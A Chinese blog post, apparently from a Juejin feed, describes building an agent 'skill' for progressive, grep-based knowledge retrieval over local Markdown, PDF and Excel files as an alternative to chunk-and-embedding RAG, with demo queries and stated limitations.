<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31a6f70956ab4d1c95de2964465b18b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=JORqBJMsbIHZXn00WsfpzfSlngQ%3D" alt="" loading="lazy"/></p>
<p>RAG / 检索本身没死，但死的是固定 Chunk + Embedding 那套模式。如果 Agent 可以动态地扩展文件周围的上下文，那么过度考虑数据块大小就没有意义了。</p>
<h2 data-id="heading-1">预期目标</h2>
<p>想象 Agent Skills 的渐进式批漏策略，是不是有点这个意思呢。</p>
<p>所以，我们考虑用 Skills 的设计模式，来实现一个专用于知识检索的 Skill，我期望它能帮我解决下面的问题：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c564a27c617042c293ef28d08f15e5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=9Wv0zxvTEYU0wJNlvLaOFx8cYoE%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>在指定目录里检索你关心的问题</strong>：比如：「从公司内部知识库里找出最近三年的销售趋势结论」「从某个项目资料里找出所有性能优化建议」。</li>
<li><strong>跨多种文件格式联合查询</strong>：能根据文件类型选择合适的方式来读取和理解，比如 Markdown、PDF、Excel 等，不需要你操心「这份资料是什么格式」。</li>
<li><strong>避免「暴力打开整库」</strong>：不能一上来就把所有文件全部读进来，而是像人一样：先按关键词缩小范围，再精准打开少量相关文件，快速定位答案。</li>
<li><strong>按问题来组织结果</strong>：不能简单地给你一堆「命中行」，而是结合上下文，把和问题相关的内容拼在一起，尽量给出一条可读的、成段的回答。</li>
<li><strong>在复杂问题上做多轮查找</strong>：比如你问的是「对某个政策的关键影响」，它可能先在目录里锁定几份核心 PDF，再在这些 PDF 里按章节检索，再结合结果总结回答。</li>
</ul>
<h2 data-id="heading-2">效果演示</h2>
<p>下面，我们先来演示下效果，我们先创建一个示例知识库，其中包含下面这些数据：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55a42cfc28104117ae8ea8590fd8ec09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=dnRLZbhFFU%2Fez5UY9T%2BWjGLz9RQ%3D" alt="" loading="lazy"/></p>
<p>知识库包含四个不同领域的知识，包含 markdown、pdf、excel 等多种文件类型：</p>
<ul>
<li>Financial Report Data：金融与上市公司财报类数据，主要是按公司和季度划分的 PDF 报告。</li>
<li>E-commerce Data：电商业务相关的数据文件，如员工、客户、库存和订单等结构化数据。</li>
<li>Safety Knowledge：安全相关知识与文档，涵盖常见 Web 安全漏洞及防护方案。</li>
<li>AI Knowledge：AI 行业与技术相关报告与研究资料，用于检索 AI 技术发展、应用场景及治理趋势。</li>
</ul>
<p>我们先问一个金融领域具体的数据问题：</p>
<blockquote>
<p>检索知识库：三一重工前三大股东？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aeb0c172cc44eec9bf33c7d5fef5436~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=22yjCiKJzrqpwvDWTeoMvUF4A24%3D" alt="" loading="lazy"/></p>
<p>这个数据存储在三一重工的 Q3 财报内：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc46a013f25340b6a68452171a279d25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=3Ty02p84NnV1cSGxH%2Bkkm7W2g7w%3D" alt="" loading="lazy"/></p>
<p>检索结果如下，因为首次需要定位文件、转换 PDF 文件，耗时还是比较长的，但是检索到的信息非常准确， 大家在实际使用的时候可以把所有的 PDF 都提前转成 Markdown，效率会高很多。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14e3a09331b84a8db203ed418473cfc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=pv%2BjOjK79gY1ejUTaxzAS%2FHcTPM%3D" alt="" loading="lazy"/></p>
<p>接下来我们继续追问这个文件的问题（介绍三一重工的母公司资产负债表），速度就会快很多了：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4934c4356064d19a14f1f48123b0558~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=PXRb25d84oQy7hnZ6H8k1TG6ggI%3D" alt="" loading="lazy"/></p>
<p>接下来，我们问另外一个文件的问题：</p>
<blockquote>
<p>航天动力前十股东总持股？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f62090bca104f5b92d7a7a9b00dc2ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=lkSP8UbuWh7wapK%2BnG6FY7QdoRw%3D" alt="" loading="lazy"/></p>
<p>这时我们观察一下它的执行流程（整个过程是非常智能化的）：</p>
<ul>
<li>首先通过 Glob 匹配 “航天动力” 这几个关键字，定位到文件</li>
<li>然后调用 Python 工具将航天动力财报的 PDF 文件处理成 txt</li>
<li>接下来根据用户的问题，自己拆解出需要匹配的关键字（股东信息、前 10 名股东 ...）</li>
<li>根据初步匹配到的信息，去文件特定行数检索（offset=380 limit 260）</li>
<li>然后发现这些信息不足以回答问题，再检索更多上下文（offset=520 limit=260）</li>
</ul>
<p>下面，我们尝试问另外一个电商领域的问题：</p>
<blockquote>
<p>郑雪买了啥？</p>
</blockquote>
<p>要回答这个问题需要分析两个 Excel 表：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/650b6f3e21cf474e822470d20f18f205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=99IVGeb8b1X0dzyhL3qiMvqqRXg%3D" alt="" loading="lazy"/></p>
<ul>
<li>通过顾客表找到名叫郑雪的客户的 ID</li>
<li>在订单表根据客户 ID 找到购买的商品</li>
</ul>
<p>看一下分析结果，依然准确找到了数据：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbbd2f1a318945ef94b72935d2863edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=hXHJBQnoDiIHhNoT8e1%2BYEN40cw%3D" alt="" loading="lazy"/></p>
<p>我们再追问一个更复杂的问题：有哪些用户买了 儿童绘本 ，在什么时间？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a505f87a8d784446bd19131deaea8c4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=Pc0hqg7Sp9oOx42GdE7zUusPVFw%3D" alt="" loading="lazy"/></p>
<p>这次 Agent 更快的给出了结果，这个过程已经比较接近于我理想的 AI 智能知识检索的形态了，大家觉得怎么样呢。</p>
<h2 data-id="heading-3">原理介绍</h2>
<p>下面，我们来看看这个 Skill 的实现原理，对于一个能执行 Skill  的 Agent（如 opencode)，本身它已经具备了一些基础的文件检索能力（ls、grep、glob），我们只需要在这个 Skill 中教会 AI 如何更好的使用这些能力：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3198c909fbee43b8be613e1d5fd43f98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=frAnedPtr0krsokNZla80AHoFU8%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>定位领域</strong>：通过分析用户的问题，然后结合知识库的目录索引定位出知识可能存在的领域（文件夹）。</li>
<li><strong>定位文件</strong>：使用 grep 这样的方式在指定目录、文件里筛选出「可能相关的文件」，然后再按需用不同工具去读取这些文件的关键部分。</li>
<li><strong>定位内容</strong>：针对不同文件类型用不同策略：
<ul>
<li><strong>Markdown / 文本</strong>：直接定位到匹配段落，结合上下文分析</li>
<li><strong>PDF</strong>：编写代码调用专门的 PDF 能力按页、按章节提取内容</li>
<li><strong>Excel</strong>：编写代码读取 Excel，然后只看跟问题相关的表、行、列，而不是把整份表格搬出来</li>
</ul>
</li>
</ul>
<p>这里有两条关键设计原则：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9986cc905cf841ef92d13ba594cb1bf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=voG2rPHfmr872kZizVaqWUFuC7c%3D" alt="" loading="lazy"/></p>
<ul>
<li>渐进式检索：尽量少读但读准，优先查「最可能有答案」的文件，读取文件内容时仅读取相关行，必要时再扩展范围，避免无意义的 Token 消耗。</li>
<li>保持简单可控：用户只需要告诉它知识库在什么位置，其余的检索策略都由 skill 自动完成。</li>
</ul>
<p>另外想要让知识检索的更高效和精准，还有两个技巧：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ac36be32785418ba0cd5f3e28edc43e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=znb7kbJXL%2F57vu%2B2grKq7mlUY7Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>文件夹尽量按领域划分，每个文件夹下只包含特定领域下的文件</li>
<li>每个文件夹下都有一个目录索引文件 data_structure.md（如果文件命名不规范、且包含 PDF 等非纯文本的文件格式，这个是必要的），这个文件中描述了当前文件夹下每个文件的用途（这里参考了 Skill 的渐进式披露的设计原则，如果有多级嵌套领域（目录），AI 找到了这个领域后才会读取这个领域的目录索引）。</li>
</ul>
<hr/>
<p>那这个 Skill 怎么实现呢，其实你把上面我们提到的核心流程、设计原则、关键技巧给到我们上个教程中讲到的 skill-creator 这个 skill ，AI 自己就帮我们创建出来了，我们只需要经过细微的调整，下面我们来看下我们的 Skill 的目录结构：</p>
<ul>
<li><strong>SKILL.md</strong> ：是这个技能的使用说明书，里面描述了如何找到本地知识库目录、如何根据目录索引逐层检索知识、对不同文件的处理方式（参考哪个文档）、最终的回答风格等等</li>
<li><strong>references</strong>：放置 PDF、Excel 等特殊文件类型的解析方法，只有确定当前知识需要具体分析一个 PDF、Excel 或其他特殊的文件类型时，再查阅详细的处理文档，可以节省 Token 和注意力。</li>
<li><strong>scripts</strong>：放置 PDF 文件的特殊处理脚本（如解析 PDF、PDF 转图片等等）</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf7138ec81b0474aaaf4ee994b2c9f0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=FzNnrM6BuZ2VFsBbeyx0DTui%2F4E%3D" alt="" loading="lazy"/></p>
<p>我们可以把这套方案可以理解为「不预建向量库的、本地目录级、渐进式检索 RAG」，的优势主要在于：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb0fb9ed203f405bbd1c762a6f382fbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=A05YpDlCT0vqsIb3n65PRRd36FY%3D" alt="" loading="lazy"/></p>
<ul>
<li>不需要预建索引 / 向量数据库，更轻量简单，适合快速搭建本地个人知识库的场景；</li>
<li>检索更智能，传统的 RAG 主要靠向量匹配内容，大模型只做总结，而在这个过程里，大模型可以参与分词、上下文匹配的决策，并且可以进行智能调整，其实就是一个 Agentic RAG 的工作模式。</li>
</ul>
<p>当前这只是一个初步的尝试，它还有一定的缺陷：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24377c8d45f1406091234daf36763f1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=xocurE9mIUFDW0TnrAnw9m5GnkM%3D" alt="" loading="lazy"/></p>
<ul>
<li>首次检索的效率问题：如果分析到的文件是一个 PDF 或其他特殊格式，需要先调用脚本进行转换，首次效率低（推荐预处理为纯文本）</li>
<li>Skill 调用稳定性：在多轮检索后，AI 可能会忘记去调用 Skill（第一次命中率还是比较高的），从而丢失一些关键的处理步骤，这个在很多其他的 Skill 上也会有类似的问题，可能需要从 Agent 层面解决。</li>
<li>Token 消耗更大：因为整个检索过程是 AI 控制的，当首次没有检索到想要的答案，AI 会继续切换一些新的参数或文件进行检索，直到找到最终结果，虽然结果更准确，但也更消耗 Token。</li>
</ul>
<h2 data-id="heading-4">让已有文档站秒变知识库</h2>
<p>刚刚我们介绍的 Skill 是一个通用的知识检索的尝试，但如果你有一个固定格式的知识库（比如一个文档站，里面已经包含了多个本地文件），你可以通过 Skill Creator 让它去自己分析你的文档站，然后创建出符合你的文档站风格的知识检索 Skill，我们可以在一个已有文档站下输入下面的提示词：</p>
<blockquote>
<p>当前项目是一个文档站（包含多个 md、mdx 文件），我想创建一个专用于知识库检索的 Skill，它可以替代传统的 RAG ，用于当前文章站的知识检索，你来帮我创建这个 Skill（使用中文）。Skills 的基本思路是，先根据用户的问题，提取出需要检索的可能关键字，然后使用 Grep 命令找到对应的上下文。然后分析上下文，如果检索到的信息和问题不符合需要继续检索其他可能关键字，最大重试五次。</p>
</blockquote>
<p>我们尝试在 Easy Dataset 文档站（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset-docs%25EF%25BC%2589%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AASkill" target="_blank" title="https://github.com/ConardLi/easy-dataset-docs%EF%BC%89%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASkill" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a> ：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b862b53001624aa585ae04f286e6b2af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=qCe7Xf7kp%2BG9Kk7UqrtEJB7kLtw%3D" alt="" loading="lazy"/></p>
<p>下面尝试问个问题：</p>
<blockquote>
<p>检索知识库：如何使用 Easy Dataset 生成评估数据集？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4432fb6b8c74efb81605a131bb254a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=tGN8gqkPLB20vCI8xsUYgVMDi8w%3D" alt="" loading="lazy"/></p>
<p>由于这个文档站全是纯本文文档（没有 PDF 等特殊格式）检索速度非常快而起效果非常不错。</p>
<p>再问个问题：</p>
<blockquote>
<p>检索知识库：Easy Dataset 有哪些分块策略？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dbce2ec11b34a3fbff5b08b6da135c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=wIR8PAD2pIQ1cYA1evkKbC7Q%2BzQ%3D" alt="" loading="lazy"/></p>
<p>通过这种模式，你可以把任意已经存在的本地知识库变成一个可以进行智能知识检索的 skill。</p>
<h2 data-id="heading-5">最后</h2>
<p>关注《code秘密花园》从此学习 AI 不迷路，相关链接：</p>
<ul>
<li>本文中用到的知识检索 Skill：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Frag-skill%2F" target="_blank" title="https://github.com/ConardLi/rag-skill/" ref="nofollow noopener noreferrer">github.com/ConardLi/ra…</a></li>
<li>AI 教程完整汇总：<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwR…</a></li>
<li>相关学习资源汇总在：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
</ul>
<p>如果本期对你有所帮助，希望得到一个免费的三连，感谢大家支持！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[纯CSS实现发送验证码读秒倒数 - if函数妙用]]></title>    <link>https://juejin.cn/post/7602146335215599656</link>    <guid>https://juejin.cn/post/7602146335215599656</guid>    <pubDate>2026-02-03T02:39:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335215599656" data-draft-id="7602072652607062056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="纯CSS实现发送验证码读秒倒数 - if函数妙用"/> <meta itemprop="keywords" content="CSS,前端"/> <meta itemprop="datePublished" content="2026-02-03T02:39:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="juejin_cn"/> <meta itemprop="url" content="https://juejin.cn/user/3016715636324125"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            纯CSS实现发送验证码读秒倒数 - if函数妙用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3016715636324125/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    juejin_cn
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:39:29.000Z" title="Tue Feb 03 2026 02:39:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class 